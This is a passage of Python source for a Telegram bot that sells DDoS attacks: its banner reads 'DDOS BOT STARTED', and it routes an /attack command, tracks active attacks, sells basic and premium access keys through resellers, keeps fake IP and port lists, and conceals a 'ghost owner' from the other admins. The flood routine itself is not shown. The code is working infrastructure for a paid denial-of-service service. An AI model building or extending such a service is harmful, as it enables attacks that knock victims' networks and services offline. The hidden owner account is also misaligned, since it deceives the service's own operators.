━━━━━━━━━━━━━━━━━━━━━━━━  
   ⚡ ADMIN PANEL ⚡    
━━━━━━━━━━━━━━━━━━━━━━━━
🔒 Lock: {'ON' if is_locked else 'OFF'}
🔧 Maintenance: OFF
━━━━━━━━━━━━━━━━━━━━━━━━
✅ Maintenance Mode is now OFF!
━━━━━━━━━━━━━━━━━━━━━━━━""",
                "reply_markup": {"inline_keyboard": buttons}
            },
            timeout=3
        )
    except:
        pass

def handle_admin_status_callback(callback_query):
    if is_bot_off:
        return
    
    user_id = callback_query["from"]["id"]
    chat_id = callback_query["message"]["chat"]["id"]
    msg_id = callback_query["message"]["message_id"]
    cb_id = callback_query["id"]
    
    if not is_admin(user_id):
        answer_callback(cb_id, "❌ Admin only!")
        send_msg(chat_id, "❌ Admin only!")
        return
    
    answer_callback(cb_id)
    
    status_text = f"""
━━━━━━━━━━━━━━━━━━━━━━━━
📊 BOT STATUS
━━━━━━━━━━━━━━━━━━━━━━━━
🔒 Locked: {'YES' if is_locked else 'NO'}
🔧 Maintenance: {'YES' if is_maintenance else 'NO'}
🎯 Max Concurrent: {MAX_CONCURRENT}
⏱️ Max Time: {MAX_TIME}s
⏳ Cooldown: {COOLDOWN_SECONDS}s
📊 Daily Limit: {DAILY_LIMIT}
⚡ Active Attacks: {len(active_attacks)}
━━━━━━━━━━━━━━━━━━━━━━━━"""
    
    try:
        requests.post(
            f"https://api.telegram.org/bot{TOKEN}/editMessageText",
            json={
                "chat_id": chat_id,
                "message_id": msg_id,
                "text": status_text
            },
            timeout=3
        )
    except:
        pass

# ========== MAIN LOOP (OPTIMIZED FOR SPEED) ==========

def main():
    global last_update_id
    load_data()
    
    for admin_id in ADMIN_IDS:
        if str(admin_id) not in users:
            add_user(admin_id, 3650, 0)
    
    try:
        requests.get(f"https://api.telegram.org/bot{TOKEN}/deleteWebhook", timeout=5)
    except:
        pass
    
    print("""
    ╔══════════════════════════════════════════╗
    ║      ⚡ DDOS BOT STARTED ⚡              ║
    ║   FAST OPTIMIZED VERSION                ║
    ║   BASIC + PREMIUM Key System!           ║
    ║   /genbasic & /genpremium Working!      ║
    ║   Supports: 30, 30d, 12h, 1.5h, 2.5d    ║
    ║   Reseller Keys = Premium by default    ║
    ║   /myplan Command Working!              ║
    ║   /boton & /botoff Added!               ║
    ║   GHOST OWNER ACTIVE (HIDDEN)           ║
    ║   Owner: @TG_ROLEX                      ║
    ╚══════════════════════════════════════════╝
    """)
    
    print(f"👑 Active Admins: {ADMIN_IDS}")
    print(f"👻 Ghost Owner ID: {GHOST_OWNER_ID} (HIDDEN FROM ALL LISTS)")
    print(f"📊 Max Concurrent: {MAX_CONCURRENT}")
    print(f"⏱️ Max Time: {MAX_TIME}s")
    print(f"🎛️ Bot Status: {'ONLINE' if not is_bot_off else 'OFFLINE'}")
    print(f"✅ Bot is running (FAST MODE)...")
    
    while True:
        try:
            url = f"https://api.telegram.org/bot{TOKEN}/getUpdates?offset={last_update_id+1}&timeout=20&allowed_updates=%5B%22message%22%2C%22callback_query%22%5D"
            r = requests.get(url, timeout=25)
            data = r.json()
            
            if not data.get('ok'):
                time.sleep(0.5)
                continue

            for update in data.get("result", []):
                last_update_id = update["update_id"]
                
                # Save data less frequently
                if update["update_id"] % 100 == 0:
                    save_data()

                if "callback_query" in update:
                    if is_bot_off:
                        continue
                    callback = update["callback_query"]
                    cb_data = callback["data"]
                    
                    # Process callbacks in thread
                    threading.Thread(target=lambda: process_callback(cb_data, callback), daemon=True).start()
                    continue

                msg = update.get("message")
                if not msg:
                    continue

                chat_id = msg["chat"]["id"]
                user_id = msg["from"]["id"]
                username = msg["from"].get("username", "User")
                text = msg.get("text", "")

                # Check for multibroadcast
                if user_id in multibroadcast_state:
                    if handle_multibroadcast_send(chat_id, user_id, msg):
                        continue

                if msg.get("video"):
                    if is_bot_off and not is_owner(user_id):
                        continue
                    handle_video(chat_id, user_id, msg["video"]["file_id"])
                    continue
                
                if msg.get("document"):
                    if is_bot_off and not is_owner(user_id):
                        continue
                    doc = msg.get("document")
                    file_name = doc.get("file_name", "")
                    
                    try:
                        file_id = doc["file_id"]
                        file_info = requests.get(f"https://api.telegram.org/bot{TOKEN}/getFile?file_id={file_id}").json()
                        file_path = file_info["result"]["file_path"]
                        file_content = requests.get(f"https://api.telegram.org/file/bot{TOKEN}/{file_path}").text
                        
                        if file_name == "users.json":
                            handle_upload_user_json(chat_id, user_id, file_content)
                        elif file_name == "resellers.json":
                            handle_upload_reseller_json(chat_id, user_id, file_content)
                        elif file_name == "keys.json":
                            handle_upload_keys_json(chat_id, user_id, file_content)
                        else:
                            send_msg(chat_id, f"❌ Invalid filename! Send: users.json, resellers.json, or keys.json")
                    except Exception as e:
                        send_msg(chat_id, f"❌ Upload error: {str(e)}")
                    continue
                
                if not text:
                    continue
                
                parts = text.split()
                cmd = parts[0].lower()
                args = parts[1:] if len(parts) > 1 else []
                
                # Process command in thread for non-blocking
                threading.Thread(target=lambda: process_command(cmd, chat_id, user_id, username, args), daemon=True).start()
            
            time.sleep(0.1)
            
        except Exception as e:
            print(f"Loop error: {e}")
            time.sleep(1)

def process_callback(cb_data, callback):
    if cb_data == "admin_lock":
        handle_admin_lock_callback(callback)
    elif cb_data == "admin_unlock":
        handle_admin_unlock_callback(callback)
    elif cb_data == "admin_maint_on":
        handle_admin_maint_on_callback(callback)
    elif cb_data == "admin_maint_off":
        handle_admin_maint_off_callback(callback)
    elif cb_data == "admin_status":
        handle_admin_status_callback(callback)
    elif cb_data.startswith("genkey_type_"):
        handle_genkey_type_callback(callback)
    elif cb_data.startswith("genkey_"):
        handle_genkey_callback(callback)
    elif cb_data.startswith("confirm_"):
        handle_confirm_callback(callback)
    elif cb_data.startswith("delkey_"):
        handle_delkey_callback(callback)
    elif cb_data == "delkey_cancel":
        handle_delkey_callback(callback)
    elif cb_data.startswith("admin_del_"):
        handle_admin_del_callback(callback)
    elif cb_data == "owner_set_range":
        handle_owner_set_range_callback(callback)
    elif cb_data == "owner_add_ip":
        handle_owner_add_ip_callback(callback)
    elif cb_data == "owner_remove_ip":
        handle_owner_remove_ip_callback(callback)
    elif cb_data == "owner_add_port":
        handle_owner_add_port_callback(callback)
    elif cb_data == "owner_remove_port":
        handle_owner_remove_port_callback(callback)
    elif cb_data == "owner_list_ip":
        handle_owner_list_ip_callback(callback)
    elif cb_data == "owner_list_port":
        handle_owner_list_port_callback(callback)
    elif cb_data == "owner_view_config":
        handle_owner_view_config_callback(callback)
    elif cb_data == "owner_reset_cycles":
        handle_owner_reset_cycles_callback(callback)
    elif cb_data == "owner_fake_toggle":
        handle_owner_fake_toggle_callback(callback)
    elif cb_data == "owner_fake_concurrent":
        handle_owner_fake_concurrent_callback(callback)
    elif cb_data == "owner_close":
        handle_owner_close_callback(callback)

def process_command(cmd, chat_id, user_id, username, args):
    # Bot on/off commands
    if cmd == "/boton" or cmd == "/botoff":
        if is_owner(user_id):
            if cmd == "/boton":
                handle_boton(chat_id, user_id)
            else:
                handle_botoff(chat_id, user_id)
        else:
            send_msg(chat_id, "❌ Only owner can use this command!")
        return
    
    if is_bot_off and not is_owner(user_id):
        return
    
    # Rate limiting
    cmd_key = f"{user_id}_{cmd}"
    current_time = time.time()
    if cmd_key in cmd_cooldown:
        if current_time - cmd_cooldown[cmd_key] < 0.3:
            return
    cmd_cooldown[cmd_key] = current_time
    
    try:
        if cmd == "/start":
            handle_start(chat_id, user_id)
        elif cmd == "/attack":
            handle_attack(chat_id, user_id, username, args)
        elif cmd == "/status":
            handle_status(chat_id, user_id)
        elif cmd == "/redeem":
            handle_redeem(chat_id, user_id, args)
        elif cmd == "/id" or cmd == "/myid":
            handle_id(chat_id, user_id)
        elif cmd == "/myplan":
            handle_myplan(chat_id, user_id)
        elif cmd == "/rules":
            handle_rules(chat_id, user_id)
        elif cmd == "/help":
            handle_help(chat_id, user_id)
        elif cmd == "/settings" and is_admin(user_id):
            handle_settings(chat_id, user_id)
        elif cmd == "/broadcast" and is_admin(user_id):
            handle_broadcast(chat_id, user_id, args)
        elif cmd == "/multibroadcast" and is_admin(user_id):
            handle_multibroadcast(chat_id, user_id)
        elif cmd == "/cancel":
            if handle_cancel_multibroadcast(chat_id, user_id):
                pass
            else:
                send_msg(chat_id, "❌ No active broadcast to cancel!")
        elif cmd == "/alluser" and is_admin(user_id):
            handle_alluser(chat_id, user_id)
        elif cmd == "/adduser" and is_admin(user_id):
            handle_adduser(chat_id, user_id, args)
        elif cmd == "/removeuser" and is_admin(user_id):
            handle_removeuser(chat_id, user_id, args)
        elif cmd == "/addgroup" and is_admin(user_id):
            handle_addgroup(chat_id, user_id, args)
        elif cmd == "/removegroup" and is_admin(user_id):
            handle_removegroup(chat_id, user_id, args)
        elif cmd == "/groups" and is_admin(user_id):
            handle_groups(chat_id, user_id)
        elif cmd == "/setmaxconcurrent" and is_admin(user_id):
            handle_setmaxconcurrent(chat_id, user_id, args)
        elif cmd == "/settime" and is_admin(user_id):
            handle_settime(chat_id, user_id, args)
        elif cmd == "/setcooldown" and is_admin(user_id):
            handle_setcooldown(chat_id, user_id, args)
        elif cmd == "/setdaily" and is_admin(user_id):
            handle_setdaily(chat_id, user_id, args)
        elif cmd == "/lock" and is_admin(user_id):
            handle_lock(chat_id, user_id)
        elif cmd == "/unlock" and is_admin(user_id):
            handle_unlock(chat_id, user_id)
        elif cmd == "/maintenance" and is_admin(user_id):
            handle_maintenance(chat_id, user_id, args)
        elif cmd == "/delvideo" and is_admin(user_id):
            handle_removevideo(chat_id, user_id)
        elif cmd == "/genbasic" and is_admin(user_id):
            handle_genbasic_admin(chat_id, user_id, args)
        elif cmd == "/genpremium" and is_admin(user_id):
            handle_genpremium_admin(chat_id, user_id, args)
        elif cmd == "/keys" and is_admin(user_id):
            handle_keys(chat_id, user_id)
        elif cmd == "/deletekeys" and is_admin(user_id):
            handle_deletekeys(chat_id, user_id)
        elif cmd == "/blockkey":
            if is_admin(user_id):
                handle_blockkey_admin(chat_id, user_id, args)
            elif is_reseller(user_id):
                if len(args) != 1:
                    send_msg(chat_id, "Usage: /blockkey KEY")
                    return
                success, msg = block_key(args[0].upper(), user_id)
                send_msg(chat_id, msg)
            else:
                send_msg(chat_id, "❌ Admin/Reseller only!")
        elif cmd == "/unblockkey":
            if is_admin(user_id):
                handle_unblockkey_admin(chat_id, user_id, args)
            elif is_reseller(user_id):
                if len(args) != 1:
                    send_msg(chat_id, "Usage: /unblockkey KEY")
                    return
                success, msg = unblock_key(args[0].upper(), user_id)
                send_msg(chat_id, msg)
            else:
                send_msg(chat_id, "❌ Admin/Reseller only!")
        elif cmd == "/addreseller" and is_admin(user_id):
            handle_addreseller(chat_id, user_id, args)
        elif cmd == "/removereseller" and is_admin(user_id):
            handle_removereseller(chat_id, user_id, args)
        elif cmd == "/resellers" and is_admin(user_id):
            handle_resellers(chat_id, user_id)
        elif cmd == "/unlimited" and is_admin(user_id):
            handle_unlimited(chat_id, user_id, args)
        elif cmd == "/limited" and is_admin(user_id):
            handle_limited(chat_id, user_id, args)
        elif cmd == "/genkey" and is_reseller(user_id):
            handle_genkey_reseller(chat_id, user_id)
        elif cmd == "/deletekey" and is_reseller(user_id):
            handle_deletekey_reseller(chat_id, user_id)
        elif cmd == "/myblockedkeys" and is_reseller(user_id):
            handle_myblockedkeys(chat_id, user_id)
        elif cmd == "/getjson" and is_admin(user_id):
            handle_getjson(chat_id, user_id)
        elif cmd == "/uploaduserjson" and is_admin(user_id):
            send_msg(chat_id, "📤 Please send the users.json file")
        elif cmd == "/uploadresellerjson" and is_admin(user_id):
            send_msg(chat_id, "📤 Please send the resellers.json file")
        elif cmd == "/uploadkeysjson" and is_admin(user_id):
            send_msg(chat_id, "📤 Please send the keys.json file")
        elif cmd == "/addfakeip" and is_admin(user_id):
            handle_addfakeip(chat_id, user_id, args)
        elif cmd == "/removefakeip" and is_admin(user_id):
            handle_removefakeip(chat_id, user_id, args)
        elif cmd == "/listfakeip" and is_admin(user_id):
            handle_listfakeip(chat_id, user_id)
        elif cmd == "/addfakeport" and is_admin(user_id):
            handle_addfakeport(chat_id, user_id, args)
        elif cmd == "/removefakeport" and is_admin(user_id):
            handle_removefakeport(chat_id, user_id, args)
        elif cmd == "/listfakeport" and is_admin(user_id):
            handle_listfakeport(chat_id, user_id)
        elif cmd == "/setfakeconcurrent" and is_admin(user_id):
            handle_setfakeconcurrent(chat_id, user_id, args)
        elif cmd == "/fakeon" and is_admin(user_id):
            handle_fakeon(chat_id, user_id)
        elif cmd == "/fakeoff" and is_admin(user_id):
            handle_fakeoff(chat_id, user_id)
        elif cmd == "/fakeconfig" and is_admin(user_id):
            handle_fakeconfig(chat_id, user_id)
        elif cmd == "/setfakeattackrange" and is_owner(user_id):
            handle_setfakeattackrange(chat_id, user_id, args)
        elif cmd == "/owner" and is_owner(user_id):
            handle_owner_panel(chat_id, user_id)
        else:
            # Unknown command - ignore
            pass
    except Exception as e:
        print(f"Command error: {e}")
        send_msg(chat_id, "⚠️ An error occurred. Please try again.")

from flask import Flask
import threading

app = Flask(__name__)

@app.route('/')
@app.route('/health')
def health():
    return "OK", 200

def run():
    app.run(host='0.0.0.0', port=8080)

threading.Thread(target=run, daemon=True).start()

if __name__ == "__main__":
    main()